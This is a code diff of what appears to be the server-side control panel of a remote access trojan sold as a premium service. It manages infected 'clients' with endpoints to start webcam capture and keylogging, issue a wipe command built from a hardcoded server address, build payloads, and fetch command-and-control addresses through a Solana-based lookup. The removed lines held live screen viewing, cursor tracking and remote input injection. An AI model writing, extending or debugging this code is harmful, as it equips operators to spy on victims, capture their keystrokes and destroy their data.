@@ -15,11 +15,12 @@ import { fileURLToPath } from 'node:url';
 
 import { remoteDb, initRemoteDb } from './remote_db.js';
 import { db, initLocalDb, UPLOAD_DIR } from './local_db.js';
-import { startUdp, closeUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor, getPing } from './net.js';
+import { startUdp, closeUdp, getPing } from './net.js'; 
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
 import { buildJavaPayload } from './builder/java_build.js';
 import { getCachedUser, invalidateUser, userCacheById, userCacheByKey, getCache, setCache, clearCache } from './cache.js';
+import { fetchSolanaIp, getRemoteIp } from './discovery.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -297,6 +298,10 @@ app.get('/api/health', (_req, res) => {
              time: new Date().toISOString() });
 });
 
+app.get('/api/remote_ip', requireAuth, (req, res) => {
+  res.json({ ip: getRemoteIp() });
+});
+
 app.get('/api/getkey/:buildId', async (req, res) => {
   const buildId = Number(req.params.buildId);
   const [rows] = await db.query(`SELECT key FROM builds WHERE id = ?`, [buildId]);
@@ -340,7 +345,6 @@ app.post('/api/signup', limitAuth, async (req, res) => {
 
   const uid = Number(info.insertId);
   
-  // Also insert locally
   await db.query(`
     INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
@@ -612,7 +616,7 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
     }
   }
 
-  const base = 'http://95.182.96.216'; // HARDCODED
+  const base = 'http://95.182.96.216'; // HARDCODED MAIN SERVER
   const line = buildWipeCommand(base);
 
   const [info] = await db.query(`
@@ -658,66 +662,6 @@ app.post('/api/clients/:id/rdp/stop', requireAuth, requirePremium, async (req, r
   res.json({ ok: true });
 });
 
-app.post('/api/clients/:id/rdp/update', requireAuth, requirePremium, async (req, res) => {
-  const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
-  if (!client.length) return res.status(404).json({ error: 'client not found' });
-  const ok = sendCfg(cid, JSON.stringify(req.body || {}));
-  res.json({ ok });
-});
-
-app.get('/api/clients/:id/screen', requireAuth, requirePremium, async (req, res) => {
-  const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
-  if (!client.length) return res.status(404).json({ error: 'client not found' });
-  const bytes = getFrame(cid);
-  if (!bytes) return res.status(204).end();
-
-  let ctype = 'application/octet-stream';
-  if (bytes.length >= 12 &&
-      bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46 &&
-      bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50) {
-    ctype = 'image/webp';
-  } else if (bytes.length >= 3 && bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {
-    ctype = 'image/jpeg';
-  }
-
-  res.setHeader('Content-Type', ctype);
-  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
-  res.setHeader('Pragma', 'no-cache');
-  res.setHeader('Expires', '0');
-  res.send(bytes);
-});
-
-app.get('/api/clients/:id/cursor', requireAuth, requirePremium, async (req, res) => {
-  const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
-  if (!client.length) return res.status(404).json({ error: 'client not found' });
-
-  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
-  res.setHeader('Pragma', 'no-cache');
-  res.setHeader('Expires', '0');
-
-  const c = getCursor(cid);
-  if (!c) return res.status(204).end();
-  res.json(c);
-});
-
-app.get('/api/clients/:id/monitors', requireAuth, requirePremium, async (req, res) => {
-  const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
-  if (!client.length) return res.status(404).json({ error: 'client not found' });
-  res.json(getMonitors(cid));
-});
-
-app.post('/api/clients/:id/input', requireAuth, requirePremium, async (req, res) => {
-  const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
-  if (!client.length) return res.status(404).json({ error: 'client not found' });
-  const ok = sendInput(cid, JSON.stringify(req.body || {}));
-  res.json({ ok });
-});
-
 app.post('/api/clients/:id/webcam/start', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
   const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
@@ -745,27 +689,6 @@ app.post('/api/clients/:id/webcam/stop', requireAuth, requirePremium, async (req
     VALUES (?, ?, 'webcam', '{"stop":true}', 'pending', ?)
   `, [req.user.uid, cid, Date.now()]);
   res.json({ ok: true });
-});
-
-app.get('/api/clients/:id/webcam', requireAuth, requirePremium, async (req, res) => {
-  const cid = Number(req.params.id);
-  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
-  if (!client.length) return res.status(404).json({ error: 'client not found' });
-  const bytes = getWebcamFrame(cid);
-  if (!bytes) return res.status(204).end();
-
-  let ctype = 'application/octet-stream';
-  if (bytes.length >= 12 &&
-      bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46 &&
-      bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50) {
-    ctype = 'image/webp';
-  } else if (bytes.length >= 3 && bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {
-    ctype = 'image/jpeg';
-  }
-
-  res.setHeader('Content-Type', ctype);
-  res.setHeader('Cache-Control', 'no-store');
-  res.send(bytes);
 });
 
 app.post('/api/clients/:id/keylog/start', requireAuth, requirePremium, async (req, res) => {
@@ -1099,12 +1022,11 @@ app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(50
 async function syncUsers() {
   try {
     const [remoteUsers] = await remoteDb.query('SELECT * FROM users');
-    const localUsers = localDb.prepare('SELECT * FROM users').all();
+    const localUsers = db.prepare('SELECT * FROM users').all();
     
     const remoteMap = new Map(remoteUsers.map(u => [u.id, u]));
     const localMap = new Map(localUsers.map(u => [u.id, u]));
 
-    // 1. Push missing local users to remote
     for (const u of localUsers) {
       if (!remoteMap.has(u.id)) {
         await remoteDb.query(`
@@ -1114,16 +1036,15 @@ async function syncUsers() {
       }
     }
 
-    // 2. Pull missing users and update premium
     for (const u of remoteUsers) {
       const local = localMap.get(u.id);
       if (!local) {
-        localDb.prepare(`
+        db.prepare(`
           INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at, premium_until)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
         `).run(u.id, u.username, u.email, u.password_hash, u.account_key, u.login_token, u.discord_webhook, u.created_at, u.premium_until);
       } else if (local.premium_until !== u.premium_until || local.discord_webhook !== u.discord_webhook) {
-        localDb.prepare('UPDATE users SET premium_until = ?, discord_webhook = ? WHERE id = ?').run(u.premium_until, u.discord_webhook, u.id);
+        db.prepare('UPDATE users SET premium_until = ?, discord_webhook = ? WHERE id = ?').run(u.premium_until, u.discord_webhook, u.id);
       }
     }
   } catch (e) {
@@ -1131,8 +1052,8 @@ async function syncUsers() {
   }
 }
 
-setInterval(syncUsers, 10 * 60 * 1000); // Sync every 10 mins
-setTimeout(syncUsers, 5000); // Initial sync
+setInterval(syncUsers, 10 * 60 * 1000);
+setTimeout(syncUsers, 5000);
 
 // ─── Build Auto-Refresh ──────────────────────────────────────────────────────
 const AUTO_REFRESH_INTERVAL_MS = 6 * 60 * 60 * 1000;
@@ -1203,6 +1124,10 @@ async function refreshAllBuilds() {
 
 setInterval(refreshAllBuilds, AUTO_REFRESH_INTERVAL_MS);
 setTimeout(refreshAllBuilds, 10_000);
+
+// ─── Solana IP Fetcher ───────────────────────────────────────────────────────
+setInterval(fetchSolanaIp, 10 * 60 * 1000);
+fetchSolanaIp();
 
 const udpSock = startUdp({
   host: CFG.bindHost, port: CFG.udpPort,
